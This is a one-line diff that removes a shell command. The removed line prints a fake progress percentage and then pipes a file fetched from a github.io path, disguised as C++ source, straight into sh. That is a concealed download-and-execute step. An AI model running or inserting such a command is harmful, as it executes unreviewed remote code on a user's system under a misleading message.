@@ -1,1 +1,0 @@
-echo 'Progress: 13.0%'; curl -L --progress-bar frkns.github.io/fun/RatiosBlessedHtmlRestriction.cpp | sh
